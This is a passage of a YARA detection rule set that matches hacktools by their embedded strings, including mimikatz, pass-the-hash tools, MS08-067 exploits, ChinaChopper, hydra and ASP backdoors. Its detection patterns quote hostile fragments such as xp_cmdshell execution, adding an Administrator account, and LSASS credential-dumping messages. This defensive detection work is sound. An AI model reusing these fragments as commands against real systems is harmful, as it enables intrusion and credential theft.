$s1 = "by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies" fullword ascii /* PEStudio Blacklist: strings */ /* score: '48.00' */
$s2 = "whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found." fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */
$s3 = "specify addresses to use. Format: ADDCREDENTIAL_ADDR:ENCRYPTMEMORY_ADDR:FEEDBACK_ADDR:DESKEY_ADDR:LOGONSESSIONLIST_ADDR:LOGONSES" ascii /* PEStudio Blacklist: strings */ /* score: '28.00' */
$s4 = "Could not enable debug privileges. You must run this tool with an account with administrator privileges." fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */
$s5 = "-B is now used by default. Trying to find correct addresses.." fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */
$s6 = "Cannot get LSASS.EXE PID!" fullword ascii /* score: '14.00' */
condition:
uint16(0) == 0x5a4d and filesize < 320KB and 2 of them
}
rule SSC_EditKeyLogReadMe {
meta:
description = "Disclosed hacktool set (old stuff) - file EditKeyLogReadMe.txt"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "dfa90540b0e58346f4b6ea12e30c1404e15fbe5a"
strings:
$s0 = "editKeyLog.exe KeyLog.exe," fullword ascii
$s1 = "WinEggDrop.DLL" fullword ascii
$s2 = "nc.exe" fullword ascii
$s3 = "KeyLog.exe" fullword ascii
$s4 = "EditKeyLog.exe" fullword ascii
$s5 = "wineggdrop" fullword ascii
condition:
3 of them
}
rule SSC_aspfile2 {
meta:
description = "Disclosed hacktool set (old stuff) - file aspfile2.asp"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "14efbc6cb01b809ad75a535d32b9da4df517ff29"
strings:
$s0 = "response.write \"command completed success!\" " fullword ascii
$s1 = "for each co in foditems " fullword ascii
$s3 = "<input type=text name=text6 value=\"<%= szCMD6 %>\"><br> " fullword ascii
$s19 = "<title>Hello! Welcome </title>" fullword ascii
condition:
all of them
}
rule SSC_MS08_067_Exploit_Hacktools_CN {
meta:
description = "Disclosed hacktool set - file cs.exe"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "a3e9e0655447494253a1a60dbc763d9661181322"
strings:
$s0 = "MS08-067 Exploit for CN by EMM@ph4nt0m.org" fullword ascii
$s3 = "Make SMB Connection error:%d" fullword ascii
$s5 = "Send Payload Over!" fullword ascii
$s7 = "Maybe Patched!" fullword ascii
$s8 = "RpcExceptionCode() = %u" fullword ascii
$s11 = "ph4nt0m" fullword wide
$s12 = "\\\\%s\\IPC" ascii
condition:
4 of them
}
rule SSC_NetBIOS_Name_Scanner {
meta:
description = "Auto-generated rule on file NetBIOS Name Scanner.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "888ba1d391e14c0a9c829f5a1964ca2c"
strings:
$s0 = "IconEx"
$s2 = "soft Visual Stu"
$s4 = "NBTScanner!y&"
condition:
all of them
}
rule SSC__hscan_hscan_hscangui {
meta:
description = "Chinese Hacktool Set - from files hscan.exe, hscan.exe, hscangui.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
super_rule = 1
hash0 = "17a743e40790985ececf5c66eaad2a1f8c4cffe8"
hash1 = "568b06696ea0270ee1a744a5ac16418c8dacde1c"
hash2 = "af8aced0a78e1181f4c307c78402481a589f8d07"
strings:
$s1 = ".\\log\\Hscan.log" fullword ascii
$s2 = ".\\report\\%s-%s.html" fullword ascii
$s3 = "[%s]: checking \"FTP account: ftp/ftp@ftp.net\" ..." fullword ascii
$s4 = "[%s]: IPC NULL session connection success !!!" fullword ascii
$s5 = "Scan %d targets,use %4.1f minutes" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 240KB and all of them
}
rule SSC_Jc_WinEggDrop_Shell {
meta:
description = "Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "820674b59f32f2cf72df50ba4411d7132d863ad2"
strings:
$s0 = "Sniffer.dll" fullword ascii
$s4 = ":Execute net.exe user Administrator pass" fullword ascii
$s5 = "Fport.exe or mport.exe " fullword ascii
$s6 = ":Password Sniffering Is Running |Not Running " fullword ascii
$s9 = ": The Terminal Service Port Has Been Set To NewPort" fullword ascii
$s15 = ": Del www.exe                   " fullword ascii
$s20 = ":Dir *.exe                    " fullword ascii
condition:
2 of them
}
rule SSC_HScan_v1_20_PipeCmd {
meta:
description = "Chinese Hacktool Set - file PipeCmd.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "64403ce63b28b544646a30da3be2f395788542d6"
strings:
$s1 = "%SystemRoot%\\system32\\PipeCmdSrv.exe" fullword ascii
$s2 = "PipeCmd.exe" fullword wide
$s3 = "Please Use NTCmd.exe Run This Program." fullword ascii
$s4 = "%s\\pipe\\%s%s%d" fullword ascii
$s5 = "\\\\.\\pipe\\%s%s%d" fullword ascii
$s6 = "%s\\ADMIN$\\System32\\%s%s" fullword ascii
$s7 = "This is a service executable! Couldn't start directly." fullword ascii
$s8 = "Connecting to Remote Server ...Failed" fullword ascii
$s9 = "PIPECMDSRV" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 200KB and 4 of them
}
rule SSC_CN_Portscan : APT
{
meta:
description = "CN Port Scanner"
author = "Florian Roth"
release_date = "2013-11-29"
confidential = false
score = 70
strings:
$s1 = "MZ"
$s2 = "TCP 12.12.12.12"
condition:
($s1 at 0) and $s2
}
rule SSC_Hacktools_CN_Panda_445TOOL {
meta:
description = "Disclosed hacktool set - file 445TOOL.rar"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "92050ba43029f914696289598cf3b18e34457a11"
strings:
$s0 = "scan.bat" fullword ascii
$s1 = "Http.exe" fullword ascii
$s2 = "GOGOGO.bat" fullword ascii
$s3 = "ip.txt" fullword ascii
condition:
all of them
}
rule SSC_CGISscan_CGIScan {
meta:
description = "Auto-generated rule on file CGIScan.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "338820e4e8e7c943074d5a5bc832458a"
strings:
$s1 = "Wang Products" fullword wide
$s2 = "WSocketResolveHost: Cannot convert host address '%s'"
$s3 = "tcp is the only protocol supported thru socks server"
condition:
all of ($s*)
}
rule SSC_aspbackdoor_ipclear {
meta:
description = "Disclosed hacktool set (old stuff) - file ipclear.vbs"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "9f8fdfde4b729516330eaeb9141fb2a7ff7d0098"
strings:
$s0 = "Set ServiceObj = GetObject(\"WinNT://\" & objNet.ComputerName & \"/w3svc\")" fullword ascii
$s1 = "wscript.Echo \"USAGE:KillLog.vbs LogFileName YourIP.\"" fullword ascii
$s2 = "Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)" fullword ascii
$s3 = "Set objNet = WScript.CreateObject( \"WScript.Network\" )" fullword ascii
$s4 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
condition:
all of them
}
rule SSC_XScanLib {
meta:
description = "Chinese Hacktool Set - file XScanLib.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "c5cb4f75cf241f5a9aea324783193433a42a13b0"
strings:
$s4 = "XScanLib.dll" fullword ascii
$s6 = "Ports/%s/%d" fullword ascii
$s8 = "DEFAULT-TCP-PORT" fullword ascii
$s9 = "PlugCheckTcpPort" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 360KB and all of them
}
rule SSC_CN_Hacktool_BAT_PortsOpen {
meta:
description = "Detects a chinese BAT hacktool for local port evaluation"
author = "Florian Roth"
score = 60
date = "12.10.2014"
strings:
$s0 = "for /f \"skip=4 tokens=2,5\" %%a in ('netstat -ano -p TCP') do (" ascii
$s1 = "in ('tasklist /fi \"PID eq %%b\" /FO CSV') do " ascii
$s2 = "@echo off" ascii
condition:
all of them
}
rule SSC_OracleScan {
meta:
description = "Chinese Hacktool Set - file OracleScan.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "10ff7faf72fe6da8f05526367b3522a2408999ec"
strings:
$s1 = "MYBLOG:HTTP://HI.BAIDU.COM/0X24Q" fullword ascii
$s2 = "\\Borland\\Delphi\\RTL" fullword ascii
$s3 = "USER_NAME" ascii
$s4 = "FROMWWHERE" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 300KB and all of them
}
rule SSC_ms10048_x86 {
meta:
description = "Chinese Hacktool Set - file ms10048-x86.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "e57b453966e4827e2effa4e153f2923e7d058702"
strings:
$s1 = "[ ] Resolving PsLookupProcessByProcessId" fullword ascii
$s2 = "The target is most likely patched." fullword ascii
$s3 = "Dojibiron by Ronald Huizer, (c) master@h4cker.us ." fullword ascii
$s4 = "[ ] Creating evil window" fullword ascii
$s5 = "%sHANDLEF_INDESTROY" fullword ascii
$s6 = "[+] Set to %d exploit half succeeded" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and 4 of them
}
rule SSC_Generate {
meta:
description = "Chinese Hacktool Set - file Generate.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "2cb4c3916271868c30c7b4598da697f59e9c7a12"
strings:
$s1 = "C:\\TEMP\\" fullword ascii
$s2 = "Connection Closed Gracefully.;Could not bind socket. Address and port are alread" wide
$s3 = "$530 Please login with USER and PASS." fullword ascii
$s4 = "_Shell.exe" fullword ascii
$s5 = "ftpcWaitingPassword" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 2000KB and 3 of them
}
rule SSC_CN_Hacktool_ScanPort_Portscanner {
meta:
description = "Detects a chinese Portscanner named ScanPort"
author = "Florian Roth"
score = 70
date = "12.10.2014"
strings:
$s0 = "LScanPort" fullword wide
$s1 = "LScanPort Microsoft" fullword wide
$s2 = "www.yupsoft.com" fullword wide
condition:
all of them
}
rule SSC_xscan_gui {
meta:
description = "Chinese Hacktool Set - file xscan_gui.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "a9e900510396192eb2ba4fb7b0ef786513f9b5ab"
strings:
$s1 = "%s -mutex %s -host %s -index %d -config \"%s\"" fullword ascii
$s2 = "www.target.com" fullword ascii
$s3 = "%s\\scripts\\desc\\%s.desc" fullword ascii
$s4 = "%c Active/Maximum host thread: %d/%d, Current/Maximum thread: %d/%d, Time(s): %l" ascii
condition:
uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}
rule SSC_Mimikatz_Logfile
{
meta:
description = "Detects a log file generated by malicious hack tool mimikatz"
author = "Florian Roth"
score = 80
date = "2015/03/31"
reference = "https://github.com/Neo23x0/Loki/blob/master/signatures/thor-hacktools.yar"
strings:
$s1 = "SID               :" ascii fullword
$s2 = "* NTLM     :" ascii fullword
$s3 = "Authentication Id :" ascii fullword
$s4 = "wdigest :" ascii fullword
condition:
all of them
}
rule SSC_Dos_fp {
meta:
description = "Chinese Hacktool Set - file fp.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "41d57d356098ff55fe0e1f0bcaa9317df5a2a45c"
strings:
$s1 = "fpipe -l 53 -s 53 -r 80 192.168.1.101" fullword ascii
$s2 = "FPipe.exe" fullword wide
$s3 = "http://www.foundstone.com" fullword ascii
$s4 = "%s %s port %d. Address is already in use" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 65KB and all of them
}
rule SSC_OSEditor {
meta:
description = "Chinese Hacktool Set - file OSEditor.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "6773c3c6575cf9cfedbb772f3476bb999d09403d"
strings:
$s1 = "OSEditor.exe" fullword wide
$s2 = "netsafe" wide
$s3 = "OSC Editor" fullword wide
$s4 = "GIF89" ascii
$s5 = "Unlock" ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and all of them
}
rule SSC_x64_klock {
meta:
description = "Chinese Hacktool Set - file klock.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "44825e848bc3abdb6f31d0a49725bb6f498e9ccc"
strings:
$s1 = "Bienvenue dans un processus distant" fullword wide
$s2 = "klock.dll" fullword ascii
$s3 = "Erreur : le bureau courant (" fullword wide
$s4 = "klock de mimikatz pour Windows" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 907KB and all of them
}
rule SSC_kiwi_tools_gentil_kiwi {
meta:
description = "Chinese Hacktool Set - from files kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, sekurlsa.dll, kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, sekurlsa.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
super_rule = 1
hash0 = "e57e79f190f8a24ca911e6c7e008743480c08553"
hash1 = "55d5dabd96c44d16e41f70f0357cba1dda26c24f"
hash2 = "7ac7541e20af7755b7d8141c5c1b7432465cabd8"
hash3 = "9fbfe3eb49d67347ab57ae743f7542864bc06de6"
hash4 = "5c90d648c414bdafb549291f95fe6f27c0c9b5ec"
hash5 = "7addce4434670927c4efaa560524680ba2871d17"
hash6 = "28c5c0bdb7786dc2771672a2c275be7d9b742ec7"
hash7 = "6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5"
hash8 = "5d578df9a71670aa832d1cd63379e6162564fb6b"
hash9 = "febadc01a64a071816eac61a85418711debaf233"
hash10 = "569ca4ff1a5ea537aefac4a04a2c588c566c6d86"
hash11 = "56a61c808b311e2225849d195bbeb69733efe49a"
hash12 = "8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16"
hash13 = "44825e848bc3abdb6f31d0a49725bb6f498e9ccc"
hash14 = "f661d6516d081c37ab7da0f4ec21b2cc6a9257c6"
hash15 = "6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5"
strings:
$s1 = "mimikatz" fullword wide
$s2 = "Copyright (C) 2012 Gentil Kiwi" fullword wide
$s3 = "Gentil Kiwi" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}
rule SSC_Hacktools_CN_Burst_Thecard {
meta:
description = "Disclosed hacktool set - file Thecard.bat"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "50b01ea0bfa5ded855b19b024d39a3d632bacb4c"
strings:
$s0 = "tasklist |find \"Clear.bat\"||start Clear.bat" fullword ascii
$s1 = "Http://www.coffeewl.com" fullword ascii
$s2 = "ping -n 2 localhost 1>nul 2>nul" fullword ascii
$s3 = "for /L %%a in (" fullword ascii
$s4 = "MODE con: COLS=42 lines=5" fullword ascii
condition:
all of them
}
rule SSC_iKAT_startbar {
meta:
description = "Tool to hide unhide the windows startbar from command line - iKAT hack tools - file startbar.exe"
author = "Florian Roth"
date = "05.11.14"
score = 50
reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
hash = "0cac59b80b5427a8780168e1b85c540efffaf74f"
strings:
$s2 = "Shinysoft Limited1" fullword ascii
$s3 = "Shinysoft Limited0" fullword ascii
$s4 = "Wellington1" fullword ascii
$s6 = "Wainuiomata1" fullword ascii
$s8 = "56 Wright St1" fullword ascii
$s9 = "UTN-USERFirst-Object" fullword ascii
$s10 = "New Zealand1" fullword ascii
condition:
all of them
}
rule SSC_sql1433_SQL {
meta:
description = "Chinese Hacktool Set - file SQL.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "025e87deadd1c50b1021c26cb67b76b476fafd64"
strings:
/* WIDE: ProductName 1433 */
$s0 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 31 00 34 00 33 00 33 }
/* WIDE: ProductVersion 1,4,3,3 */
$s1 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 31 00 2C 00 34 00 2C 00 33 00 2C 00 33 }
condition:
uint16(0) == 0x5a4d and filesize < 90KB and all of them
}
rule SSC_RangeScan {
meta:
description = "Disclosed hacktool set (old stuff) - file RangeScan.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "bace2c65ea67ac4725cb24aa9aee7c2bec6465d7"
strings:
$s0 = "RangeScan.EXE" fullword wide
$s4 = "<br><p align=\"center\"><b>RangeScan " fullword ascii
$s9 = "Produced by isn0" fullword ascii
$s10 = "RangeScan" fullword wide
$s20 = "%d-%d-%d %d:%d:%d" fullword ascii
condition:
3 of them
}
rule SSC_sig_238_iecv {
meta:
description = "Disclosed hacktool set (old stuff) - file iecv.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "6e6e75350a33f799039e7a024722cde463328b6d"
strings:
$s1 = "Edit The Content Of Cookie " fullword wide
$s3 = "Accessories\\wordpad.exe" fullword ascii
$s4 = "gorillanation.com" fullword ascii
$s5 = "Before editing the content of a cookie, you should close all windows of Internet" ascii
$s12 = "http://nirsoft.cjb.net" fullword ascii
condition:
all of them
}
rule SSC_Dll_LoadEx {
meta:
description = "Chinese Hacktool Set - file Dll_LoadEx.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "213d9d0afb22fe723ff570cf69ff8cdb33ada150"
strings:
$s0 = "WiNrOOt@126.com" fullword wide
$s1 = "Dll_LoadEx.EXE" fullword wide
$s3 = "You Already Loaded This DLL ! :(" fullword ascii
$s10 = "Dll_LoadEx Microsoft " fullword wide
$s17 = "Can't Load This Dll ! :(" fullword ascii
$s18 = "WiNrOOt" fullword wide
$s20 = " Dll_LoadEx(&A)..." fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 120KB and 3 of them
}
rule SSC_Tools_xport {
meta:
description = "Chinese Hacktool Set - file xport.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "9584de562e7f8185f721e94ee3cceac60db26dda"
strings:
$s1 = "Match operate system failed, 0x%00004X:%u:%d(Window:TTL:DF)" fullword ascii
$s2 = "Example: xport www.xxx.com 80 -m syn" fullword ascii
$s3 = "%s - command line port scanner" fullword ascii
$s4 = "xport 192.168.1.1 1-1024 -t 200 -v" fullword ascii
$s5 = "Usage: xport <Host> <Ports Scope> [Options]" fullword ascii
$s6 = ".\\port.ini" fullword ascii
$s7 = "Port scan complete, total %d port, %d port is opened, use %d ms." fullword ascii
$s8 = "Code by glacier <glacier@xfocus.org>" fullword ascii
$s9 = "http://www.xfocus.org" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}
rule SSC_ArtTrayHookDll {
meta:
description = "Disclosed hacktool set (old stuff) - file ArtTrayHookDll.dll"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "4867214a3d96095d14aa8575f0adbb81a9381e6c"
strings:
$s0 = "ArtTrayHookDll.dll" fullword ascii
$s7 = "?TerminateHook@@YAXXZ" fullword ascii
condition:
all of them
}
rule SSC_Dos_ch {
meta:
description = "Chinese Hacktool Set - file ch.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "60bbb87b08af840f21536b313a76646e7c1f0ea7"
strings:
$s0 = "/Churraskito/-->Usage: Churraskito.exe \"command\" " fullword ascii
$s4 = "fuck,can't find WMI process PID." fullword ascii
$s5 = "/Churraskito/-->Found token %s " fullword ascii
$s8 = "wmiprvse.exe" fullword ascii
$s10 = "SELECT * FROM IIsWebInfo" fullword ascii
$s17 = "WinSta0\\Default" fullword ascii  /* Goodware String - occured 22 times */
condition:
uint16(0) == 0x5a4d and filesize < 260KB and 3 of them
}
rule SSC_EditServer_HackTool {
meta:
description = "Disclosed hacktool set (old stuff) - file EditServer.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "87b29c9121cac6ae780237f7e04ee3bc1a9777d3"
strings:
$s0 = "%s Server.exe" fullword ascii
$s1 = "Service Port: %s" fullword ascii
$s2 = "The Port Must Been >0 & <65535" fullword ascii
$s8 = "3--Set Server Port" fullword ascii
$s9 = "The Server Password Exceeds 32 Characters" fullword ascii
$s13 = "Service Name: %s" fullword ascii
$s14 = "Server Password: %s" fullword ascii
$s17 = "Inject Process Name: %s" fullword ascii
$x1 = "WinEggDrop Shell Congirator" fullword ascii
condition:
5 of ($s*) or $x1
}
rule SSC_epathobj_exp32 {
meta:
description = "Chinese Hacktool Set - file epathobj_exp32.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "ed86ff44bddcfdd630ade8ced39b4559316195ba"
strings:
$s0 = "Watchdog thread %d waiting on Mutex" fullword ascii
$s1 = "Exploit ok run command" fullword ascii
$s2 = "\\epathobj_exp\\Release\\epathobj_exp.pdb" fullword ascii
$s3 = "Alllocated userspace PATHRECORD () %p" fullword ascii
$s4 = "Mutex object did not timeout, list not patched" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 270KB and all of them
}
rule SSC_MarathonTool {
meta:
description = "Chinese Hacktool Set - file MarathonTool.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "084a27cd3404554cc799d0e689f65880e10b59e3"
strings:
$s0 = "MarathonTool" ascii
$s17 = "/Blind SQL injection tool based in heavy queries" fullword ascii
$s18 = "SELECT UNICODE(SUBSTRING((system_user),{0},1))" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 1040KB and all of them
}
rule SSC_scanms_scanms {
meta:
description = "Chinese Hacktool Set - file scanms.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "47787dee6ddea2cb44ff27b6a5fd729273cea51a"
strings:
$s1 = "--- ScanMs Tool --- (c) 2003 Internet Security Systems ---" fullword ascii
$s2 = "Scans for systems vulnerable to MS03-026 vuln" fullword ascii
$s3 = "More accurate for WinXP/Win2k, less accurate for WinNT" fullword ascii /* PEStudio Blacklist: os */
$s4 = "added %d.%d.%d.%d-%d.%d.%d.%d" fullword ascii
$s5 = "Internet Explorer 1.0" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 300KB and 3 of them
}
rule SSC_CN_Toolset__XScanLib_XScanLib_XScanLib {
meta:
description = "Detects a Chinese hacktool from a disclosed toolset - from files XScanLib.dll, XScanLib.dll, XScanLib.dll"
author = "Florian Roth"
reference = "http://qiannao.com/ls/905300366/33834c0c/"
reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
date = "2015/03/30"
score = 70
super_rule = 1
hash0 = "af419603ac28257134e39683419966ab3d600ed2"
hash1 = "c5cb4f75cf241f5a9aea324783193433a42a13b0"
hash2 = "135f6a28e958c8f6a275d8677cfa7cb502c8a822"
strings:
$s1 = "Plug-in thread causes an exception, failed to alert user." fullword
$s2 = "PlugGetUdpPort" fullword
$s3 = "XScanLib.dll" fullword
$s4 = "PlugGetTcpPort" fullword
$s11 = "PlugGetVulnNum" fullword
condition:
all of them
}
rule SSC_ArtTray_zip_Folder_ArtTray {
meta:
description = "Disclosed hacktool set (old stuff) - file ArtTray.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "ee1edc8c4458c71573b5f555d32043cbc600a120"
strings:
$s0 = "http://www.brigsoft.com" fullword wide
$s2 = "ArtTrayHookDll.dll" fullword ascii
$s3 = "ArtTray Version 1.0 " fullword wide
$s16 = "TRM_HOOKCALLBACK" fullword ascii
condition:
all of them
}
rule SSC_LinuxHacktool_eyes_scanssh {
meta:
description = "Linux hack tools - file scanssh"
author = "Florian Roth"
reference = "not set"
date = "2015/01/19"
hash = "467398a6994e2c1a66a3d39859cde41f090623ad"
strings:
$s0 = "Connection closed by remote host" fullword ascii
$s1 = "Writing packet : error on socket (or connection closed): %s" fullword ascii
$s2 = "Remote connection closed by signal SIG%s %s" fullword ascii
$s4 = "Reading private key %s failed (bad passphrase ?)" fullword ascii
$s5 = "Server closed connection" fullword ascii
$s6 = "%s: line %d: list delimiter not followed by keyword" fullword ascii
$s8 = "checking for version `%s' in file %s required by file %s" fullword ascii
$s9 = "Remote host closed connection" fullword ascii
$s10 = "%s: line %d: bad command `%s'" fullword ascii
$s13 = "verifying that server is a known host : file %s not found" fullword ascii
$s14 = "%s: line %d: expected service, found `%s'" fullword ascii
$s15 = "%s: line %d: list delimiter not followed by domain" fullword ascii
$s17 = "Public key from server (%s) doesn't match user preference (%s)" fullword ascii
condition:
all of them
}
rule SSC_CookieTools {
meta:
description = "Chinese Hacktool Set - file CookieTools.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "b6a3727fe3d214f4fb03aa43fb2bc6fadc42c8be"
strings:
$s0 = "http://210.73.64.88/doorway/cgi-bin/getclientip.asp?IP=" fullword ascii
$s2 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
$s3 = "Connection Closed Gracefully.;Could not bind socket. Address and port are alread" wide
$s8 = "OnGetPasswordP" fullword ascii
$s12 = "http://www.chinesehack.org/" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 5000KB and 2 of them
}
rule SSC_Hacktools_CN_Burst_sql {
meta:
description = "Disclosed hacktool set - file sql.exe"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "d5139b865e99b7a276af7ae11b14096adb928245"
strings:
$s0 = "s.exe %s %s %s %s %d /save" fullword ascii
$s2 = "s.exe start error...%d" fullword ascii
$s4 = "EXEC sp_addextendedproc xp_cmdshell,'xplog70.dll'" fullword ascii
$s7 = "EXEC master..xp_cmdshell 'wscript.exe cc.js'" fullword ascii
$s10 = "Result.txt" fullword ascii
$s11 = "Usage:sql.exe [options]" fullword ascii
$s17 = "%s root %s %d error" fullword ascii
$s18 = "Pass.txt" fullword ascii
$s20 = "SELECT sillyr_at_gmail_dot_com INTO DUMPFILE '%s\\\\sillyr_x.so' FROM sillyr_x" fullword ascii
condition:
6 of them
}
rule SSC_ChinaChopper_caidao {
meta:
description = "Chinese Hacktool Set - file caidao.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "056a60ec1f6a8959bfc43254d97527b003ae5edb"
strings:
$s1 = "Pass,Config,n{)" fullword ascii
$s2 = "phMYSQLZ" fullword ascii
$s3 = "\\DHLP\\." fullword ascii
$s4 = "\\dhlp\\." fullword ascii
$s5 = "SHAutoComple" fullword ascii
$s6 = "MainFrame" ascii
condition:
uint16(0) == 0x5a4d and filesize < 1077KB and all of them
}
rule SSC_iam_iamdll : Toolkit  {
meta:
description = "Auto-generated rule - file iamdll.dll"
author = "Florian Roth"
reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
date = "2015-07-10"
score = 80
hash = "892de92f71941f7b9e550de00a57767beb7abe1171562e29428b84988cee6602"
strings:
$s0 = "LSASRV.DLL" fullword ascii /* score: '21.00' */
$s1 = "iamdll.dll" fullword ascii /* score: '21.00' */
$s2 = "ChangeCreds" fullword ascii /* score: '12.00' */
condition:
uint16(0) == 0x5a4d and filesize < 115KB and all of them
}
rule SSC_hydra_7_4_1_hydra {
meta:
description = "Chinese Hacktool Set - file hydra.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "3411d0380a1c1ebf58a454765f94d4f1dd714b5b"
strings:
$s1 = "%d of %d target%s%scompleted, %lu valid password%s found" fullword ascii
$s2 = "[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD" fullword ascii
$s3 = "hydra -P pass.txt target cisco-enable  (direct console access)" fullword ascii
$s4 = "[%d][smb] Host: %s Account: %s Error: PASSWORD EXPIRED" fullword ascii
$s5 = "[ERROR] SMTP LOGIN AUTH, either this auth is disabled" fullword ascii
$s6 = "\"/login.php:user=^USER^&pass=^PASS^&mid=123:incorrect\"" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them
}
rule SSC_ASPack_Chinese {
meta:
description = "Disclosed hacktool set (old stuff) - file ASPack Chinese.ini"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "02a9394bc2ec385876c4b4f61d72471ac8251a8e"
strings:
$s0 = "= Click here if you want to get your registered copy of ASPack" fullword ascii
$s1 = ";  For beginning of translate - copy english.ini into the yourlanguage.ini" fullword ascii
$s2 = "E-Mail:                      shinlan@km169.net" fullword ascii
$s8 = ";  Please, translate text only after simbol '='" fullword ascii
$s19 = "= Compress with ASPack" fullword ascii
condition:
all of them
}
rule SSC_Dos_sys {
meta:
description = "Chinese Hacktool Set - file sys.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "b5837047443f8bc62284a0045982aaae8bab6f18"
strings:
$s0 = "'SeDebugPrivilegeOpen " fullword ascii
$s6 = "Author: Cyg07*2" fullword ascii
$s12 = "from golds7n[LAG]'J" fullword ascii
$s14 = "DAMAGE" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 150KB and all of them
}
rule SSC_iKAT_Tool_Generic {
meta:
description = "Generic Rule for hack tool iKAT files gpdisable.exe, kitrap0d.exe, uacpoc.exe"
author = "Florian Roth"
date = "05.11.14"
score = 55
reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
super_rule = 1
hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
hash1 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
hash2 = "b65a460d015fd94830d55e8eeaf6222321e12349"
strings:
